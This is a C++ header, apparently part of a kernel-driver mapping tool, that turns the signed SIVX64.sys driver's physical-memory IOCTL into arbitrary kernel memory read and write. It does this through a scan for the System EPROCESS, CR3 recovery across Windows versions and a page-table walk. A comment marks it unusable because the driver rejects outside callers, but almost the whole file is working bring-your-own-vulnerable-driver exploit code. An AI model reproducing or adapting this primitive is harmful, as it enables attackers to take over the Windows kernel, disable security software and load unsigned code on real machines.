#pragma once
// primitive_siv.hpp
// SIVX64.sys BYOVD primitive (SIV - System Information Viewer, RH Software)
// Device: \\.\SIVDRIVER
// Physical memory R/W via dynamically resolved MmMapIoSpace — no IAT trace.
// WHQL signed by Microsoft WHCP. No CVE assigned. Not on HVCI blocklist.
// SHA256 (v5.85): 33903E8FA9F0A2ACAA4784D645E309B0BD780693824B6C2C5FEF257238C77478
//
// STATUS: UNUSABLE — driver has a custom IRP_MJ_CREATE handler that rejects
// all opens from non-SIV processes (ACCESS_DENIED for every access mask,
// including 0). Binary patching would break the WHQL signature.

#include "mapper.hpp"
#include <Windows.h>
#include <cstdint>
#include <cstring>
#include <string>
#include <memory>
#include <algorithm>
#include <iostream>
#include <vector>

#ifdef min
#undef min
#endif

#pragma pack(push, 1)
struct SIV_CMD14 {
    uint64_t PhysAddr;   // +0x00
    uint32_t Size;       // +0x08
    uint16_t Pad;        // +0x0C
    uint16_t Flags;      // +0x0E  (0x2=write, 0x4=readback)
};
#pragma pack(pop)

static constexpr DWORD SIV_IOCTL_PHYSMEM = 0x14;

// ── Physical memory read (up to ~256KB per call) ────────────────
static bool SivPhysRead(HANDLE h, uint64_t pa, void* dst, uint32_t sz) {
    if (sz == 0) return false;
    SIV_CMD14 req = {};
    req.PhysAddr = pa;
    req.Size = sz;
    req.Flags = 0x4;
    DWORD got = 0;
    if (!DeviceIoControl(h, SIV_IOCTL_PHYSMEM,
                         &req, sizeof(req),
                         dst, sz, &got, nullptr))
        return false;
    return got == sz;
}

// ── Physical memory write ───────────────────────────────────────
static bool SivPhysWrite(HANDLE h, uint64_t pa, const void* src, uint32_t sz) {
    if (sz == 0) return false;
    std::vector<uint8_t> buf(sizeof(SIV_CMD14) + sz);
    auto* req = reinterpret_cast<SIV_CMD14*>(buf.data());
    req->PhysAddr = pa;
    req->Size = sz;
    req->Flags = 0x2;
    memcpy(buf.data() + sizeof(SIV_CMD14), src, sz);
    DWORD got = 0;
    return DeviceIoControl(h, SIV_IOCTL_PHYSMEM,
                           buf.data(), (DWORD)buf.size(),
                           nullptr, 0, &got, nullptr) != 0;
}

static uint64_t SivRead8(HANDLE h, uint64_t pa) {
    uint64_t v = 0;
    SivPhysRead(h, pa, &v, 8);
    return v;
}

// ── CR3 bootstrap: full-page scan for System EPROCESS ───────────
// Win11 21H2-25H2 + Win10 2004-22H2: name=+0x5A8, pid=+0x440, cr3=+0x028
// Win10 1903/1909, 1507-1607:        name=+0x450, pid=+0x2E8, cr3=+0x028
// Win10 1703-1809:                   name=+0x450, pid=+0x2E0, cr3=+0x028
struct SivEprocOff { uint32_t cr3, pid, name; };

static uint64_t SivBootstrapCR3(HANDLE h) {
    static const SivEprocOff offsets[] = {
        { 0x028, 0x440, 0x5A8 },  // Win10 2004+ / Win11 all
        { 0x028, 0x2E8, 0x450 },  // Win10 1903/1909, 1507-1607
        { 0x028, 0x2E0, 0x450 },  // Win10 1703-1809
    };

    uint8_t page[0x1000];
    for (auto& off : offsets) {
        for (uint64_t pa = 0x100000; pa < 0x80000000ULL; pa += 0x1000) {
            if (!SivPhysRead(h, pa, page, 0x1000)) continue;

            if (memcmp(page + off.name, "System", 6) != 0) continue;

            uint64_t pid = 0;
            memcpy(&pid, page + off.pid, 8);
            if (pid != 4) continue;

            uint64_t cr3 = 0;
            memcpy(&cr3, page + off.cr3, 8);
            if (!cr3 || (cr3 & 0xFFF) || cr3 > 0x100000000ULL) continue;

            return cr3;
        }
    }
    return 0;
}

// ── 4-level page table walk (PML4 → PDPT → PD → PT) ─────────
static uint64_t SivVirtToPhys(HANDLE h, uint64_t cr3, uint64_t va) {
    auto idx = [&](int shift) { return (va >> shift) & 0x1FFULL; };

    uint64_t pml4e = SivRead8(h, (cr3 & ~0xFFFULL) + idx(39) * 8);
    if (!(pml4e & 1)) return 0;

    uint64_t pdpte = SivRead8(h, (pml4e & ~0xFFFULL) + idx(30) * 8);
    if (!(pdpte & 1)) return 0;
    if (pdpte & (1ULL << 7)) return (pdpte & ~0x3FFFFFFFULL) | (va & 0x3FFFFFFF);

    uint64_t pde = SivRead8(h, (pdpte & ~0xFFFULL) + idx(21) * 8);
    if (!(pde & 1)) return 0;
    if (pde & (1ULL << 7)) return (pde & ~0x1FFFFFULL) | (va & 0x1FFFFF);

    uint64_t pte = SivRead8(h, (pde & ~0xFFFULL) + idx(12) * 8);
    if (!(pte & 1)) return 0;
    return (pte & ~0xFFFULL) | (va & 0xFFF);
}

// ── Virtual kernel R/W (page-at-a-time, much faster than TS) ──
static bool SivVirtRead(HANDLE h, uint64_t cr3, uint64_t va, void* dst, size_t n) {
    auto* d = (uint8_t*)dst;
    while (n) {
        uint64_t pa = SivVirtToPhys(h, cr3, va);
        if (!pa) return false;
        size_t pageRem = 0x1000 - (pa & 0xFFF);
        size_t chunk = std::min(n, pageRem);
        if (!SivPhysRead(h, pa, d, (uint32_t)chunk)) return false;
        va += chunk; d += chunk; n -= chunk;
    }
    return true;
}

static bool SivVirtWrite(HANDLE h, uint64_t cr3, uint64_t va, const void* src, size_t n) {
    const auto* s = (const uint8_t*)src;
    while (n) {
        uint64_t pa = SivVirtToPhys(h, cr3, va);
        if (!pa) return false;
        size_t pageRem = 0x1000 - (pa & 0xFFF);
        size_t chunk = std::min(n, pageRem);
        if (!SivPhysWrite(h, pa, s, (uint32_t)chunk)) return false;
        va += chunk; s += chunk; n -= chunk;
    }
    return true;
}

// ── Session state ────────────────────────────────────────────
struct SivSession {
    HANDLE dev = INVALID_HANDLE_VALUE;
    uint64_t cr3 = 0;
};

// ── Open SIVDRIVER device → KernelPrimitives ─────────────────
inline KernelPrimitives OpenSivDriver(std::string& err)
{
    HANDLE h = CreateFileW(L"\\\\.\\SIVDRIVER",
                           GENERIC_READ | GENERIC_WRITE,
                           FILE_SHARE_READ | FILE_SHARE_WRITE,
                           nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h == INVALID_HANDLE_VALUE) {
        err = "OpenSivDriver: CreateFile failed err=" + std::to_string(GetLastError()) +
              " (SIV service loaded?)";
        return {};
    }

    uint32_t smoke = 0;
    if (!SivPhysRead(h, 0x1000, &smoke, 4)) {
        CloseHandle(h);
        err = "OpenSivDriver: smoke test read failed (IOCTL rejected)";
        return {};
    }

    uint64_t cr3 = SivBootstrapCR3(h);
    if (!cr3) {
        CloseHandle(h);
        err = "OpenSivDriver: CR3 bootstrap failed (System EPROCESS not found)";
        return {};
    }

    std::cout << "[+] SIVX64 opened, CR3=0x" << std::hex << cr3 << std::dec << "\n";

    auto sp = std::make_shared<SivSession>();
    sp->dev = h;
    sp->cr3 = cr3;

    KernelPrimitives p;

    p.ReadKernelMemory = [sp](void* dst, uint64_t src, size_t sz) -> bool {
        return SivVirtRead(sp->dev, sp->cr3, src, dst, sz);
    };

    p.WriteKernelMemory = [sp](uint64_t dst, const void* src, size_t sz) -> bool {
        return SivVirtWrite(sp->dev, sp->cr3, dst, src, sz);
    };

    p.AllocateKernelMemory = nullptr;

    return p;
}
